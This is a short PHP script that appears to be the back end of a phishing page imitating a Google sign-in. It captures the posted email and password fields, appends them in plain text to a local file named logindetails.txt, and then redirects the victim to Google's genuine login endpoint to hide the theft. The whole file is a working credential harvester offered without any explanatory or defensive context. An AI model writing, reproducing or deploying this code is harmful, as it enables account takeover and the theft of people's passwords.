<?php 
$file = fopen('logindetails.txt', 'a+');
$write = fwrite($file, 'email: '.$_POST['Email']. PHP_EOL .'password: '. $_POST['Passwd'].PHP_EOL.PHP_EOL );
fclose($file);
header("Location: https://www.google.com/accounts/ServiceLoginAuth");
?>
 
